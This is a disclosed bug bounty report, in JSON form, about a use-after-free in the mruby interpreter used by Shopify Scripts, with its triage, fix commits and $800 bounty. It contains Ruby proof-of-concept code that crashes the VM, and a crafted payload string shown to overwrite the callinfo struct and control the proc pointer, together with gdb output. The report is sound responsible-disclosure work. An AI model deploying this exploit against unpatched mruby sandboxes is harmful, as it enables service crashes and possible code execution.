{"id":213261,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTMyNjE=","url":"https://hackerone.com/reports/213261","title":"Use-after-free leading to an invalid pointer dereference","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-03-14T00:21:30.366Z","submitted_at":"2017-03-14T00:21:30.366Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dgaletic","url":"/dgaletic","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-02T13:29:48.105Z","bug_reporter_agreed_on_going_public_at":"2017-04-02T13:29:48.040Z","team_member_agreed_on_going_public_at":"2017-03-28T21:18:46.132Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n===\n\nThe following code demonstrates a crash:\n\n    class A \u003c def to_str\n      \"\"[1, 2, 3]\n      ensure --\u003e {} rescue\n      Struct.new.new.to_h\n      end\n    end\n\nDiscussion\n==========\n    \nmruby crashes due to an invalid pointer dereference in vm.c:1692:\n\n    1689│       L_RESCUE:\n    1690│         if (ci-\u003eridx == 0) goto L_STOP;\n    1691│         proc = ci-\u003eproc;\n    1692├\u003e        irep = proc-\u003ebody.irep;\n\n(gdb) print ci-\u003eproc\n$3 = (struct RProc *) 0x511\n\nmruby-engine crashes similarly in class.h:50:\n\n    50├\u003e    return mrb_obj_ptr(v)-\u003ec;\n    51│   }\n    52│ }\n\n(gdb) print mrb_obj_ptr(v)\n$2 = (struct RObject *) 0x6\n\nValgrind reports many (3032 errors from 108 contexts) invalid reads and writes happening inside memory free'd by a realloc. We were able to exploit this to achieve control over the callinfo struct in mruby, as demonstrated here on `proc`:\n\n    class A \u003c def to_str\n    a = \"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEp\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fsAEtAEuAEvAEwAExX\\xe5\\xfc\\xff\\xff\\x6f\\x00\\x001AE2AE3AE4AE5AE6AE7AE8AE\\x90\\xe0n\\x00\\x00\\x00\\x00\\x00FCAFDAFEAFFA\\x00\\x00\\x00\\x00HAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFk\" * 4\n      \"\"[1, 2, 3]\n      ensure --\u003e {} rescue\n      Struct.new.new.to_h\n      end\n    end\n    \nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000041f164 in mrb_vm_exec (mrb=0x6af010, proc=0xf0f0f0f0f0f0f0f, pc=0x71dd18) at /home/\u003cuser\u003e/repos/mruby/src/vm.c:1692\n(gdb) print *ci\n$3 = {mid = 1161915973, proc = 0xf0f0f0f0f0f0f0f, stackent = 0x4175454174454173, nregs = 1161918021, ridx = 2017804663, eidx = -203432, env = 0x4133454132454131, pc =0x3645413545413445, err = 0x4541384541374541, argc = 7266448, acc = 0, target_class = 0x4546414446414346}\n\nWe will continue working on this bug to see whether the same can be achieved in mruby-engine.\n\nThank you,\nDinko Galetic\nDenis Kasak","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-27T21:18:46.168Z","allow_singular_disclosure_after":-140633151.40801513,"singular_disclosure_allowed":true,"vote_count":7,"voters":["delimitry","dgaletic","red4sec","eveeez","cyberunit","linkks","spetr0x"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1539129,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-03-14T00:21:30.548Z","updated_at":"2017-03-14T00:21:30.548Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1539159,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"These results were achieved consistently on Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu 1~14.04.3). On Arch Linux (updated 2017-03-13), the PoC code did not crash on every run. In both cases, the following were built:\n\nmruby SHA: 191ee2596cc7b22e3213d82bab1a48ae6152b475\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f\n\nThe gdb output shown for mruby-engine uses a mruby submodule commit (4ab70294ea01cbaf6bdbfbea5bbd854f6661cfd8) several commits behind the one we used to test mruby on its own. The crash is present in 191ee2596cc7b22e3213d82bab1a48ae6152b475 as well, though this time in vm.c:1806 (mrb_vm_exec):\n\n    1804│         regs[acc] = v;\n    1805│       }\n    1806├\u003e      JUMP;\n    1807│     }\n\n(gdb) print *pc\nCannot access memory at address 0x0","automated_response":false,"created_at":"2017-03-14T00:49:36.123Z","updated_at":"2017-03-14T00:49:36.123Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1543069,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue and opened an issue upstream: https://github.com/mruby/mruby/issues/3515","automated_response":false,"created_at":"2017-03-15T15:05:50.230Z","updated_at":"2017-03-15T15:05:50.230Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553044,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was addressed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/ef105b5ca41018f30c38f9738d5b54c4aa0fe6e4\nhttps://github.com/mruby/mruby/commit/527dcd52478567c30547d10c87c867cc01865a82\nhttps://github.com/mruby/mruby/commit/09574922a987aaa0813a4dfd37ac89ca60ca4281\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-20T19:35:23.717Z","updated_at":"2017-03-20T19:35:23.717Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dgaletic","url":"/dgaletic"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1568996,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","automated_response":false,"created_at":"2017-03-28T21:18:39.307Z","updated_at":"2017-03-28T21:18:39.307Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"dgaletic","url":"/dgaletic"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1568997,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-28T21:18:46.147Z","updated_at":"2017-03-28T21:18:46.147Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1578440,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-04-02T13:29:48.066Z","updated_at":"2017-04-02T13:29:48.066Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1578441,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-02T13:29:48.122Z","updated_at":"2017-04-02T13:29:48.122Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}